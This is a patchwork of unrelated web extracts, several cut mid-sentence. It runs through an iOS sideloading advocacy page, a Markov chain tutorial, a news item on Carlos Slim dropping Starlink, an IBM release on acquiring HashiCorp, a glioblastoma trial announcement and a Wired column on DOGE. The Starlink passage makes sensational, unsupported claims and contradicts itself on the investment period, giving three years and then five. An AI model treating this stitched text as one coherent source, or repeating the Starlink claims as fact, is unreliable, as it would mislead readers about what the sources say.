<li>In the EU, <span><a href="https://developer.apple.com/app-store/review/guidelines/#spam">notarization guideline 4.3(a)</a><i></i></span> may prevent you from using the Digital Markets Act to maintain your own private fork of an open-source app.</li>
<li>The "free" in FOSS refers to freedom, not price. FOSS can cost money. To learn more about FOSS, see <span><a href="https://www.fsf.org/about/what-is-free-software">here</a><i></i></span>.</li>
</ul></li>
<li>Provides users with a much higher degree of control over the computing devices that they legally and rightfully own</li>
<li>Brings more flexibility to developers, and lower costs to users, through competition in third party payment processing services and app stores, and alternatives to the 30% App Store cut (+ $100/yr Apple Developer subscription)
<ul>
<li>Apps that rely primarily on revenue from subscriptions or in-app purchases are <span><a href="https://www.theverge.com/2019/3/16/18268811/spotify-apple-european-commission-antitrust-statement-war-of-words">especially affected</a><i></i></span> by Apple's 30% cut.</li>
<li>This isn't to say that 30% is a bad deal in all cases! The App Store offers a great service to most developers, but it shouldn't be the only option.</li>
</ul></li>
<li>Repurposes older devices that no longer receive software updates and can no longer download apps from the App Store</li>
<li>Circumvents any and all <span><a href="https://en.wikipedia.org/wiki/Censorship_by_Apple">censorship by Apple</a><i></i></span></li>
</ul></div>
<div>
<h2 id="is-sideloading-safe"><a href="#is-sideloading-safe"><span>🔒 Is sideloading safe?</span></a></h2><p>Sideloading is generally safe if:</p><ul>
<li>You wrote the apps that you're sideloading yourself, or</li>
<li>You carefully vet the sources of apps that you sideload, and your operating system provides some level of protection against malicious apps
<ul>
<li>Android and iOS enforce a strict sandbox on all apps, which ensures that apps can only access sensitive data with explicit user consent. macOS is moving towards enforcing a sandbox on apps from all sources as well, but it isn't there quite yet, so sideloading is still fairly risky. Windows 10+ has a built-in antivirus, but that doesn't protect you against unknown threats. Windows 10+ also has <span><a href="https://learn.microsoft.com/en-us/windows/msix/msix-container">opt-in app sandbox</a><i></i></span>, and Windows 11 <span><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/app-isolation-overview">improves the sandbox further</a><i></i></span>, but in practice sandboxing is rarely used. Be extra careful when sideloading on Windows.</li>
</ul></li>
</ul><p>In fact, some of the most secure systems in the world, arguably more secure than iOS, <a href="#do-other-devices-support-sideloading">support sideloading</a>.</p><p>Even among those who sideload, most prefer to offload these trust decisions to a third party app store. This means you only have to make a relatively high-stakes trust decision for each app store you download, which only happens once or twice in most cases. On Android, most sideloaded apps are obtained through <span><a href="https://en.wikipedia.org/wiki/F-Droid">F-Droid</a><i></i></span>, a trusted third party app store that only serves open source apps built using their own (also open source) infrastructure. On Windows, most sideloaded games are obtained through <span><a href="https://en.wikipedia.org/wiki/Steam_(service)">Steam</a><i></i></span>, a trusted third party app store that vets each game before making it available.</p><p>Ideally, third party app stores work with the underlying OS and provide the user with sufficient information about each app's author, what it does, and what sensitive data it may request access to, if any. For example, F-Droid provides a list of any Android permissions that an app may request on the app details page of every app in the store. F-Droid further provides a list of <span><a href="https://f-droid.org/docs/Anti-Features/">"anti-features"</a><i></i></span> for each app, warning users of potentially undesirable behavior such as advertising or exchanging data with proprietary network services. AltStore, an alternative app store for iOS, provides information about permissions that each app may request as well. Personally, I trust F-Droid more than the Play Store or App Store, and most of my favorite apps on my Android phone come from there.</p><figure>
<img src="https://doesioshavesideloadingyet.com/assets/altstore_and_f-droid_permissions.png" alt="Permission details on AltStore and F-Droid app listing pages">

</figure><p>iOS and Android follow a <span><a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">principle of least privilege</a><i></i></span> approach for third party apps (and usually for system apps and background processes as well). They both enforce a strict sandbox on all third party apps, regardless of where the apps were obtained from. An Android app <span><a href="https://source.android.com/docs/security/overview/app-security#the-android-permission-model-accessing-protected-apis">does not have access to any sensitive data or resources by default</a><i></i></span>. iOS works similarly. Users must explicitly grant access to any sensitive data or resources. As such, you can be fairly confident that, even if you accidentally installed a malicious app, it isn't able to access any sensitive data that you didn't explicitly provide it. iOS and Android apps also aren't allowed to interfere with the operating system itself, so you can safely and easily uninstall a malicious app without worrying about any lingering effects afterwards. Somewhat ironically, despite iOS refusing to allow sideloading, it's actually among the safest operating systems to sideload on.</p><p>Sideloading may not be safe for users who are not technically literate or are generally gullible, because they may be tricked into installing a malicious app and then granting said app permission to access sensitive data or resources. (Note that browsing the web carries similar risks, so all users of computing devices would ideally receive some baseline internet safety training.)</p><p>This is often touted as a reason why iOS should not support sideloading at all, but I wholeheartedly disagree. Even if sideloading isn't made generally available to all users, it can still be made available to technically-inclined users only. This isn't a trivial task, and requires a bit of thought to implement correctly, but it's very much possible and has <a href="#case-study-chromeos">already been done before</a>.</p></div>

<h2 id="what-would-it-mean-for-ios-to-have-sideloading"><a href="#what-would-it-mean-for-ios-to-have-sideloading"><span>🤔 What would it mean for iOS to "have" sideloading?</span></a></h2><p>For the purposes of this website, an operating system supports sideloading if it provides some means for technically-inclined end users to permanently install native apps <a href="#fn4" id="fnref4" role="doc-noteref">[4]</a> without prior approval from any company or organization, either free of charge, or for a reasonable one-time fee.</p><p>An operating system does not need to endorse, recommend, or make it easy to sideload in order for it to support sideloading as an option. Operating systems that only allow advanced users to sideload through scare prompts, hidden "development" modes, or any other methods still count. Operating systems that require a one-time payment (within reason) to unlock sideloading, or which require you to accept some basic terms (within reason) before you enable sideloading would also count. Operating systems employing any combination of the described techniques, or any other techniques, to discourage sideloading for the average user, or to prevent social engineering attacks convincing users to enable sideloading, still count.</p><p>For example, <a href="#case-study-chromeos">we consider Chrome OS</a> to support sideloading.</p><p>Apple would not have to make sweeping changes to iOS in order to qualify; in fact, a minor policy change would be more than sufficient. For example, all it would take to qualify is for Apple to remove the unnecessary expiry dates from development certificates (which can only be used on the creator's own devices, and cannot be used for distribution). They currently expire after 7 days for free accounts, or 1 year for paid accounts.</p><p>There are several community-supported unofficial sideloading methods for iOS, but we don't consider those to count, because they aren't guaranteed to continue working through iOS security updates, they aren't authorized by Apple and may break Apple's end user license agreement, and they have significant downsides.</p></div>

<p>These operating systems are regarded by security experts as being extremely secure, and yet still support sideloading:</p><ul>
<li>ChromeOS</li>
<li><span><a href="https://en.wikipedia.org/wiki/GrapheneOS">GrapheneOS</a><i></i></span>, a security and privacy enhanced fork of Android</li>
</ul><h2 id="case-study-chromeos">Case study: ChromeOS</h2><p>ChromeOS is probably the most secure mainstream consumer operating system in the world. It implements a cryptographically verified boot chain which ensures that neither the OS nor any of its components has been tampered with, mandatory full device encryption, and strict sandboxing for all third party code with no exceptions, among many other <span><a href="https://www.chromium.org/chromium-os/developer-library/reference/security/security-whitepaper/">advanced defense-in-depth security features</a><i></i></span>. All third party native code inside Android apps is isolated using virtualization, and on top of that, the standard Android app sandbox applies.</p><p>By default, apps can only be installed through the Google Play Store. To enable sideloading, you need to follow a complex series of steps, agree to some basic terms and conditions, factory reset your device, and enable <span><a href="https://www.chromium.org/chromium-os/developer-library/guides/device/developer-mode/">"developer mode"</a><i></i></span>. In addition, every time you reboot the device after enabling developer mode, you'll be reminded by the boot screen that your security is reduced and you will need to confirm that this is acceptable before the OS loads.</p><figure>
<img src="https://doesioshavesideloadingyet.com/assets/chromeos_dev_mode.png" alt="ChromeOS developer mode boot warning (via Reddit)">

</figure><p>Google created this process to ensure that it's completely infeasible for an attacker to trick someone into enabling developer mode and compromising theirself, while at the same time enabling advanced users to make full use of the hardware they purchased.</p><p>I honestly believe that, for better or for worse, this "opt-in developer mode for advanced users only" is the only sustainable approach going forward. All computers are becoming easier to use and more secure than ever before, not just iOS devices, and I think that's a good thing overall, but I also think that there should always be an "escape hatch" for advanced users (and as of the time of writing, there always is, except on iOS).</p><h2 id="macos-vs.-ios-notarization-process">macOS vs. iOS notarization process</h2><p>Apple uses the term "notarization" to describe the approval process for apps submitted to third party app stores on iOS, which is confusing because it's they use the same term to describe a very different process on macOS.</p><p>On macOS, notarization is an automated review process that performs malware checks and basic security checks on any submitted software, in addition to requiring a verified identity as part of the Apple Developer program. Apple does not impose any guidelines, besides requiring that they are not malicious, on macOS apps submitted for notarization.</p><p>On iOS, notarization is a manual review process conducted similarly to the App Store review process. An Apple employee must manually review each app for violations of the iOS <span><a href="https://developer.apple.com/help/app-store-connect/distributing-apps-in-the-european-union/submit-for-notarization/">notarization guidelines</a><i></i></span>, which are a subset of the App Store guidelines, before it can be distributed on so-called "alternative" app stores. The iOS notarization guidelines include <a href="#what-are-benefits-of-sideloading">unnecessary rules that impede legitimate apps</a>.</p><p>Another important difference between macOS and iOS notarization is that <strong>users can choose to run software that hasn't been notarized on macOS, if they accept the risks involved</strong>. Of course, Apple highly recommends that users only run software that has been notarized by Apple, and macOS blocks the installation of software that isn't notarized by default. But an option, buried deep within the Privacy &amp; Security settings, is provided, allowing advanced users to run the software of their choice.</p><figure>

</div><h2 id="altstore">AltStore</h2><p><span><a href="https://altstore.io/">AltStore</a><i></i></span> abuses Xcode's signing service, which is intended for developers to test their apps in a limited capacity before uploading them to the App Store.</p><p>Apple provides development certificates lasting 7 days for free accounts, or 1 year for paid accounts. Apps signed this way can only be installed on the developer's registered devices and can't be directly distributed to other users. iOS refuses to launch apps with expired certificates.</p><p>AltStore connects to a server running on your computer and automatically requests the re-signing of sideloaded applications every so often, ideally preventing them from ever expiring.</p><p>Pros:</p><ul>
<li>Can be used for free (in a limited capacity)</li>

</ul><p>Cons:</p><ul>
<li>Apps signed with free certificates are subject to limitations and can't access all capabilities</li>
<li>Doesn't always work reliably due to iOS background execution restrictions</li>
<li>Requires an ongoing Internet connection and a home server setup</li>
<li>Fundamentally reliant on Apple's signing service to work</li>
</ul><h2 id="jailbreaking">Jailbreaking</h2><p>Jailbreaking involves exploiting accidentally-introduced security vulnerabilities in iOS to gain more control over your device. Typically, jailbreaks enable sideloading, in addition to system-level tweaks and modifications.</p><p>Pros:</p><ul>
<li>Usually provides total or near-total control over your device</li>
<li>Enables unrestricted sideloading</li>
</ul><p>Cons:</p><ul>

I currently use a Google Pixel (Android) phone, an iPad, and a MacBook Pro. I'll probably switch to iPhone if the answer to the question this site poses ever becomes "yes".</p><p>As part of a university project, I recently developed an iOS app that keeps track of your expenses and receipts. It's not polished enough to submit to the App Store, but it would have been quite useful to me personally.</p><p>I was using my app on my iPad when all of a sudden it was disabled:</p><figure>
<img src="https://doesioshavesideloadingyet.com/assets/no_longer_available.png" alt="&quot;[App] is no longer available&quot;">

</figure><p>I soon discovered that apps you install via Xcode <a href="#how-do-i-sideload-unofficially-on-ios">only last for seven days</a>. That didn't seem right to me. My team and I wrote the app from scratch, but it didn't really feel like "our" app, because we're not even allowed to use it on our own devices without asking Apple's cloud service for permission to do so every week into eternity. This was in stark contrast to my experience with my MacBook Pro, for which I've developed numerous utilities and apps for personal use by myself without any issue.</p><p>So, I started digging into the topic of sideloading on iOS. This website is the result of my research on the topic. It's mostly factual, but it does contain some of my opinions as well.</p></div>

<li id="fn10"><p>Under the court's ruling, Google is required to allow third party app stores into its Google Play Store for a period of 3 years. Critics have argued that the ruling is unnecessary because Android already allows the sideloading of third party app stores, and that Google should not be obligated to endorse and provide hosting for third party app stores inside of their privately-operated first party store. Proponents have argued that the process of sideloading is too complex for the average user to understand, and that Google unfairly disincentivizes third party app stores through "scare screens" presented to end users and business contracts with OEMs. Epic Games sued Apple at the same time as Google for similar reasons, but ultimately <span><a href="https://en.wikipedia.org/wiki/Epic_Games_v._Apple">lost their case</a><i></i></span>.

      <p>
        
        <h3>Explained Visually</h3>
      </p>
      
      <p>By <a href="http://twitter.com/vicapow">Victor Powell</a>
      </p>
      <p>with text by <a href="http://twitter.com/lewislehe">Lewis Lehe</a>
      </p><p>Markov chains, named after <a href="https://en.wikipedia.org/wiki/Andrey_Markov">Andrey Markov</a>, are mathematical systems that hop from one "state" (a situation or set of values) to another. For example, if you made a Markov chain model of a baby's behavior, you might include "playing," "eating", "sleeping," and "crying" as states, which together with other behaviors could form a 'state space': a list of all possible states. In addition, on top of the state space, a Markov chain tells you the probabilitiy of hopping, or "transitioning," from one state to any other state---e.g., the chance that a baby currently playing will fall asleep in the next five minutes without crying first.</p>
<p>A simple, two-state Markov chain is shown below.</p>

      <p ng-controller="NoControlsCtrl">
        
        <label>speed</label>
        <st-diagram states="states" transition-matrix="transitionMatrix" center="diagramCenter" duration="duration"></st-diagram>
      </p><p>With two states (A and B) in our state space, there are 4 possible transitions (not 2, because a state can transition back into itself). If we're at 'A' we could transition to 'B' or stay at 'A'. If we're at 'B' we could transition to 'A' or stay at 'B'. In this two state diagram, the probability of transitioning from any state to any other state is 0.5.</p>
<p>Of course, real modelers don't always draw out Markov chain diagrams. Instead they use a "transition matrix" to tally the transition probabilities. Every state in the state space is included once as a row and again as a column, and each cell in the matrix tells you the probability of transitioning from its row's state to its column's state. So, in the matrix, the cells do the same job that the arrows do in the diagram.</p>

      <div ng-controller="TransitionMatrixCtrl">
        <p>
          <label> speed </label>
        </p>
        <st-diagram center="diagramCenter" states="states" transition-matrix="transitionMatrix" duration="duration" selected-transition="selected.transition"></st-diagram>
        <grid>
          <row>
            <cell></cell>
            <cell>A</cell>
            <cell>B</cell>

          <row>
          <div ng-style="{'background-color': color('A')}">
              <cell>
                <p> A </p>
              </cell>
              <cell ng-mouseover="selected.transition = [0, 0]" ng-mouseout="selected.transition = null">
                <p>
                  P(A|A): {{ transitionMatrix[0][0] | number:2 }}
                </p>
                
              </cell>
              <cell ng-mouseover="selected.transition = [0, 1]" ng-mouseout="selected.transition = null">
                <p>
                  P(B|A): {{ transitionMatrix[0][1] | number:2 }}
                </p>
                
              </cell>
            </div>
          </row>
          <row>
            <div ng-style="{'background-color': color('B')}">
              <cell>
                <p> B </p>
              </cell>
              <cell ng-mouseover="selected.transition = [1, 0]" ng-mouseout="selected.transition = null">
                <p>
                  P(A|B): {{ transitionMatrix[1][0] | number:2 }}
                </p>
                
              </cell>
              <cell ng-mouseover="selected.transition = [1, 1]" ng-mouseout="selected.transition = null">
                <p>
                  P(B|B): {{ transitionMatrix[1][1] | number:2 }}
                </p>
                
              </cell>
            </div>
          </row>
        </grid>
      </div><p>If the state space adds one state, we add one row and one column, adding one cell to every existing column and row. This means the number of cells grows quadratically as we add states to our Markov chain. Thus, a transition matrix comes in handy pretty quickly, unless you want to draw a jungle gym Markov chain diagram.</p>
<p>One use of Markov chains is to include real-world phenomena in computer simulations. For example, we might want to check how frequently a new dam will overflow, which depends on the number of rainy days in a row. To build this model, we start out with the following pattern of rainy (R) and sunny (S) days:</p>

      <p>One way to simulate this weather would be to just say "Half of the days are rainy. Therefore, every day in our simulation will have a fifty percent chance of rain." This rule would generate the following sequence in simulation:</p>

      <p>Did you notice how the above sequence doesn't look quite like the original? The second sequence seems to jump around, while the first one (the real data) seems to have a "stickyness". In the real data, if it's sunny (S) one day, then the next day is also much more likely to be sunny.</p>
<p>We can minic this "stickyness" with a two-state Markov chain. When the Markov chain is in state "R", it has a 0.9 probability of staying put and a 0.1 chance of leaving for the "S" state. Likewise, "S" state has 0.9 probability of staying put and a 0.1 chance of transitioning to the "R" state.</p>

      <p>In the hands of metereologists, ecologists, computer scientists, financial engineers and other people who need to model big phenomena, Markov chains can get to be quite large and powerful. For example, the algorithm Google uses to determine the order of search results, called <a href="https://en.wikipedia.org/wiki/PageRank">PageRank</a>, is a type of Markov chain.</p>


<p>Above, we've included a Markov chain "playground", where you can make your own Markov chains by messing around with a transition matrix. Here's a few to work from as an example: ex1, ex2, ex3 or generate one randomly. The transition matrix text will turn red if the provided matrix isn't a valid transition matrix. <em>The rows of the transition matrix must total to 1.</em> There also has to be the same number of rows as columns.</p>

            <!-- content -->
<p>In a significant business development, Mexican billionaire Carlos Slim has decided to cancel his collaboration with Elon Musk’s Starlink. The decision comes after a series of tensions between the two magnates, culminating in Slim’s choice to invest in his own infrastructure rather than relying on Starlink’s satellite technology.</p>



<p>Slim’s company, América Móvil, announced plans to invest $22 billion over the next three years to enhance its telecommunications infrastructure. This move is seen as a strategic effort to strengthen its position in the market and reduce dependency on external partners like Starlink. The decision is expected to have a substantial financial impact on Musk’s company, which had anticipated a lucrative partnership in Latin America.</p>



<p>The fallout between Slim and Musk was further exacerbated by a controversial tweet from Musk, which implied connections between Slim and organized crime. This accusation, although unproven, added fuel to the already strained relationship between the two business tycoons.</p>



<p>By opting to develop its own infrastructure, América Móvil aims to maintain control over its operations and ensure the reliability of its services. This decision marks a significant shift in the dynamics of the telecommunications industry in Latin America, highlighting the competitive nature of the market and the strategic maneuvers of its key players.</p><div>

<p><a href="https://mexicodailypost.com/2025/01/23/elon-musk-accused-carlos-slim-of-alleged-ties-to-drug-trafficking/">Elon Musk shared a post on his social network stating that Slim could have ties to criminal groups</a>, and five minutes later, Carlos Slim canceled all business collaborations with Starlink in Latin America, which made Musk lose 7 billion US dollars.</p>



<p>An hour later, Slim announced that he would transfer his projects for the next 5 years with Starlink, an investment of 22 billion dollars, to companies in China and Europe.</p>



<p>More than money, Musk lost his main partner in 25 countries, in addition to giving up all that territory to companies of his competition and, most seriously, causing the USA to continue losing commercial presence and giving it to China.</p>

Together the companies' capabilities will help clients accelerate innovation, strengthen security, and get more value from the cloud.</p>

<p><a href="https://mma.prnewswire.com/media/2629239/HashiCorp.html" rel="nofollow" target="_blank"><img alt="HashiCorp, an IBM Company." src="https://mma.prnewswire.com/media/2629239/HashiCorp.jpg" title="HashiCorp, an IBM Company."> </a></p>

<p>Today nearly 75% of enterprises are using hybrid cloud<sup>1</sup>, including public clouds from hyperscalers and on-prem data centers, which can enable true innovation with a consistent approach to delivering and managing that infrastructure at scale. Enterprises are looking for ways to more efficiently manage and modernize cloud infrastructure and security tasks from initial planning and design, to ongoing maintenance. By 2028, it is projected that generative AI will lead to the creation of 1 billion new cloud-native applications.<sup>2</sup> Supporting this scale requires infrastructure automation far beyond the capacity of the workforce alone.</p>

<p><i>"Organizations globally are looking to deploy modern, hybrid cloud-ready apps, which require automated cloud infrastructure at significant scale," <b>said <span>Rob Thomas</span>, Senior Vice President, IBM Software and Chief Commercial Officer.</b> "With this acquisition, IBM is committed to continuing to invest in and grow the HashiCorp capabilities,</i><i>&nbsp;and together, with HashiCorp's leading technology and extensive developer community, IBM's global reach and R&amp;D resources, our aim is to infuse HashiCorp technology in every data center."</i></p>

<p><i>"HashiCorp has been helping the world's largest enterprises succeed in hybrid and multi-cloud environments for over a decade. We've seen the cloud grow from its origins, and have participated first-hand in the change it has brought to the industry," <b>said <span>Dave McJannet</span>, CEO, HashiCorp.</b> "With IBM's history, </i><i>global </i><i>scale, and customer relationships, HashiCorp can now expand our reach to help our community of customers, practitioners, and partners automate, secure, and optimize their cloud infrastructure, providing an end-to-end platform for hybrid environments."</i></p>

<p><i>"HashiCorp has been a pioneer in cloud infrastructure since the earliest days of public cloud. We've built a portfolio of products to help customers embrace a cloud native approach to Infrastructure and Security Lifecycle Management that has been embraced by hundreds of thousands of organizations around the world," <b>said <span>Armon Dadgar</span>, CTO and Co-founder of HashiCorp.</b> "I'm excited for HashiCorp to join the IBM family, where there is clear alignment on the vision of enabling hybrid infrastructure for the world's biggest enterprises. Together, we can continue to invest deeply in R&amp;D innovation and enable the next generation of applications to be built and scaled."</i></p>

<p><b>Product detail and availability</b></p>

<ul type="disc">
	<li>HashiCorp's capabilities enable enterprises to use automation to deliver lifecycle management for infrastructure and security, providing a system of record for the critical workflows needed for hybrid and multi-cloud environments. HashiCorp Terraform is a leader for infrastructure provisioning in these environments. HashiCorp's offerings help clients take a highly interoperable approach to multi-cloud management, and complement IBM's commitment to industry collaboration (including deep and expanding partnerships with hyperscale cloud service providers), developer and open source communities for hybrid cloud and AI innovation.</li>
	<li>Its Terraform and Vault offerings, along with the broader HashiCorp product portfolio, are available now from IBM's automation software portfolio.</li>
	<li>HashiCorp will drive significant synergies for IBM, including across multiple strategic growth areas like Red Hat, watsonx, data security, IT automation and Consulting. For example, Terraform and the <a href="https://www.redhat.com/en/technologies/management/ansible" rel="nofollow" target="_blank">Red Hat Ansible Automation Platform</a>&nbsp;provide a powerful combination, with Terraform automating the foundational infrastructure creation across multiple cloud providers, and Ansible automating application configurations and middleware deployments on top of that infrastructure.&nbsp;</li>
	<li>In addition, HashiCorp Vault combined with <u><a href="https://www.redhat.com/en/technologies/cloud-computing/openshift" rel="nofollow" target="_blank">Red Hat OpenShift</a></u> provide robust secrets management and security capabilities across hybrid cloud environments, and Terraform can enable the building and deployment of IBM Z applications in hybrid cloud environments.</li>
</ul>

<p><b><i>Builds on IBM's Portfolio of AI-driven IT Automation Capabilities</i></b></p>

<p>The HashiCorp acquisition continues IBM's broad investments in automation software to help organizations optimize their IT spending and lower costs. This includes AI-powered software for&nbsp; application management insights across clients' portfolios to identify, predict, and suggest fixes for problems; software for full IT stack observability and to optimize application performance at the lowest cost; application resource management tools that efficiently scale operations and reduce cloud expense; financial management solutions that drive real-time insight into IT spending decisions across the enterprise; and software to integrate thousands of applications and data across hybrid cloud environments.</p>

<p>The closing of IBM's&nbsp;acquisition of HashiCorp&nbsp;includes all of the issued and outstanding common shares of HashiCorp for <span>$35</span> per share in cash, representing an enterprise value of <span>$6.4 billion</span>.</p>

<div id="readability-page-1" class="page"><div><p>An Australian-led international clinical trial will scientifically investigate the efficacy of the approach within a large cohort of eligible glioblastoma patients and could commence within a year.</p>
<p>The study will trial the use of double immunotherapy. In some patients, double immunotherapy will be combined with chemotherapy.</p>
<p>The trial will be led by The Brain Cancer Centre, which has world-leading expertise in glioblastoma.</p>
<p>“I am delighted to be handing the baton to <a href="https://www.wehi.edu.au/researcher/jim-whittle/">Dr Jim Whittle</a>, a leading Australian neuro-oncologist at Peter MacCallum Cancer Centre, The Royal Melbourne Hospital and Co-Head of Research Strategy at The Brain Cancer Centre, to commence a broader scientific study to scientifically determine if – and how – this process might work in treating glioblastoma,” said Prof Long, who also secured drug access for the clinical trial.</p>
<p>“While we are buoyed by the results of this experimental treatment so far, a clinical trial in a large group of patients would need to happen before anyone could consider it a possible breakthrough.”</p>
<p>Dr Whittle, also a laboratory head at WEHI, said: “We are pleased to be able to build on this exciting work by diving into the process of designing a clinical trial, which takes time, care and accuracy.</p>
<p>“When that process is complete, the result will be a world first clinical trial that enables us to thoroughly test the hypothesis against a representative sample of patients.”</p>
<p>The Brain Cancer Centre was founded by Carrie’s Beanies 4 Brain Cancer and established in partnership with WEHI with support from the Victorian Government.</p>
<p>The centre brings together a growing network of world-leading oncologists, immunologists, neurosurgeons, bioinformaticians and cancer biologists.</p>
<p>Commencement of recruitment for the clinical trial will be announced by The Brain Cancer Centre at a later date and will be limited to eligible patients.</p>

<div id="readability-page-1" class="page"><div data-testid="ArticlePageChunks"><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>If you’ve felt overwhelmed by all the <a href="https://www.wired.com/story/doge-autorif-mass-firing-government-workers/">DOGE</a> news, you’re not alone. You’d need too much cork board and yarn to keep track of which agencies it has occupied by now, much less what it’s doing there. Here’s a simple rubric, though, to help contextualize the DOGE updates you do have time and energy to process: It’s worse than you think.</p><p>DOGE is hard to keep track of. This is by design; the only information about the group outside of its own mistake-ridden ledger of “savings” comes from media reports. So much for being “maximally transparent,” as Elon Musk has promised. The blurriness is also partly a function of the speed and breadth with which DOGE has operated. Keeping track of the destruction is like counting individual bricks scattered around a demolition site.</p><p>You may be aware, for instance, that a <a href="https://www.wired.com/story/elon-musk-government-young-engineers/">19-year-old who goes by “Big Balls” online</a> plays some role in all this. Seems bad. But you may have missed that Edward Coristine has since been installed at the <a href="https://www.wired.com/story/doge-cisa-coristine-cybersecurity/">nation’s top cybersecurity agency</a>. And the State Department and <a data-offer-url="https://x.com/HSBCDems/status/1886503237966024846" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://x.com/HSBCDems/status/1886503237966024846&quot;}" href="https://x.com/HSBCDems/status/1886503237966024846" rel="nofollow noopener" target="_blank">the Small Business Administration</a>. And he has a Department of Homeland Security email address and, by the way, also had a recent <a href="https://www.wired.com/story/edward-coristine-tesla-sexy-path-networks-doge/">side gig selling AI Discord bots to Russians</a>. See? Worse than you think.</p><p>Even if that feels like old news, remember that it’s actually still happening, every day a fresh incursion by Big Balls and his cohort of twentysomething technologists. (In fairness, they’re not all young; some of them are old enough to <a href="https://www.wired.com/story/krause-doge-cloud-software-treasury/">present conflicts of interest so flagrant</a> that they literally lack modern precedent.)</p><p>Similarly, you’ve likely heard that the <a href="https://www.wired.com/story/doge-guts-usaid-workforce/">United States Agency for International Development has been gutted</a> and the <a href="https://www.wired.com/story/dozens-of-cfpb-workers-terminated-in-after-hours-firing-blitz/">Consumer Financial Protection Bureau has been put on ice</a>. All true, all bad. But here’s what that means in practice: Fewer people globally have access to vaccines than they did a month ago. More babies are being <a href="https://www.wired.com/story/usaid-researchers-email-access/">born with HIV/AIDS</a>. From here on out, anyone who gets ripped off by payday loan companies—or, say, <a href="https://www.wired.com/story/doge-access-consumer-financial-protection-bureau-data/">social media platforms moonlighting as payments services</a>—has lost <a href="https://www.wired.com/story/cfpb-trump-freeze-tech-investigations/">their most capable defender</a>.</p><p>Keep going. The thousands of so-called probationary employees DOGE has fired included a significant number of experienced workers who had just been promoted or transferred. <a href="https://www.wired.com/story/national-science-foundation-february-2025-firings/">National Science Foundation staffing cuts</a> and proposed <a href="https://www.wired.com/story/nih-indirect-funding-cuts-heritage-foundation/">National Institutes of Health grant limits</a> will combine to kneecap scientific research in the United States for a generation. Terminations at the US Department of Agriculture have <a href="https://www.wired.com/story/usda-layoffs-throw-climate-and-crop-projects-into-chaos/">sent programs designed to help farmers into disarray</a>. On Wednesday, the Food and Drug Administration <a data-offer-url="https://www.cnn.com/2025/02/26/health/news-fda-meeting-to-choose-flu-vaccine-composition-canceled-without-explanation/index.html" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.cnn.com/2025/02/26/health/news-fda-meeting-to-choose-flu-vaccine-composition-canceled-without-explanation/index.html&quot;}" href="https://www.cnn.com/2025/02/26/health/news-fda-meeting-to-choose-flu-vaccine-composition-canceled-without-explanation/index.html" rel="nofollow noopener" target="_blank">canceled a meeting</a> that would have given guidance on this year’s flu vaccine composition. It hasn’t been rescheduled.</p><p>Don’t care about science or vaccines?

The National Parks Service, the Internal Revenue Service, all hit hard. So don’t make any long-term bets on getting your checks on time, keeping your lights on, buying a home for the first time, or enjoying Yosemite. Don’t assume all the things that work now will still work tomorrow.</p></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>Speaking of which, let’s not forget that DOGE has fired people working to prevent bird flu and to safeguard the US nuclear arsenal. (The problem with throwing a <a data-offer-url="https://www.wsj.com/tech/that-time-elon-musk-showed-up-with-a-chain-sawliterally-6f51d12d" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.wsj.com/tech/that-time-elon-musk-showed-up-with-a-chain-sawliterally-6f51d12d&quot;}" href="https://www.wsj.com/tech/that-time-elon-musk-showed-up-with-a-chain-sawliterally-6f51d12d" rel="nofollow noopener" target="_blank">chainsaw</a> around is that you don’t make clean cuts.) The agencies in question have reportedly tried to hire those workers back. Fine. But even if they’re able to, the long-term question that hasn’t been answered yet is, Who would stay? Who would work under a regime so <a href="https://www.wired.com/story/doge-incompetence-mistakes-feature-not-bug/">cocksure and incompetent</a> that it would mistakenly fire the only handful of people who actually know how to take care of the nukes? According to a recent <a data-offer-url="https://www.thebulwark.com/p/inside-doges-dumbest-cut-yet" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.thebulwark.com/p/inside-doges-dumbest-cut-yet&quot;}" href="https://www.thebulwark.com/p/inside-doges-dumbest-cut-yet" rel="nofollow noopener" target="_blank">report</a> from The Bulwark, that brain drain is already underway.</p><p>And this is all before the real reductions in force begin, mass purges of civil servants that will soon be conducted, it seems, with an assist from <a href="https://www.wired.com/story/doge-autorif-mass-firing-government-workers/">DOGE-modified, automated software</a>. The US government is about to lose decades of institutional knowledge across who knows how many agencies, including specialists that aren’t readily replaced by loyalists.</p><p>Elon Musk has, at least, acknowledged that DOGE will make mistakes, and promised fast fixes. He even called one out specifically Wednesday, the cancelation of a USAID program designed to prevent the spread of Ebola. “We restored the Ebola prevention immediately,” he said during an appearance at Trump’s first cabinet meeting. “And there was no interruption.”</p><p>This is <a data-offer-url="https://www.washingtonpost.com/politics/2025/02/26/elon-musk-ebola-prevention-usaid-doge/" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.washingtonpost.com/politics/2025/02/26/elon-musk-ebola-prevention-usaid-doge/&quot;}" href="https://www.washingtonpost.com/politics/2025/02/26/elon-musk-ebola-prevention-usaid-doge/" rel="nofollow noopener" target="_blank">not the case</a>, as The Washington Post first reported. Not only has Ebola prevention not been restored—it was and remains severely diminished—but the Trump administration also said Wednesday it would terminate nearly 10,000 contracts and grants from USAID and the State Department. Many of those contracts represent an attempt to lessen some form of suffering in some part of the world. It’s too many individual stories to tell, too many tragedies unfolding too far away.</p><p>It’s worse than you think in the same way that your brain breaks a little when you try to picture how deep the ocean is. It’s worse than you think because by the time the courts catch up the damage will already have been done. It’s worse than you think because the people running the government seem to have no higher mission than to watch it burn.</p><p>Federal agencies could absolutely be more efficient, but we’re long past the point where efficiency is a plausible goal. DOGE’s cuts have no apparent regard for civil society or opportunity costs or long-term strategic thinking. Their targets are Elon Musk’s and Project 2025’s targets. They have found no fraud, just democracy at work. They’re apparently eager to see what happens when it no longer does.</p><p>It’s worse than you think because so far all DOGE has done is drop a boulder into the middle of a pond. If you think this is bad, wait for the ripples.</p><h2>The Chatroom</h2><p>What will be the most lasting impact of the DOGE cuts?</p><p>Leave a comment on the site or send your thoughts to <a 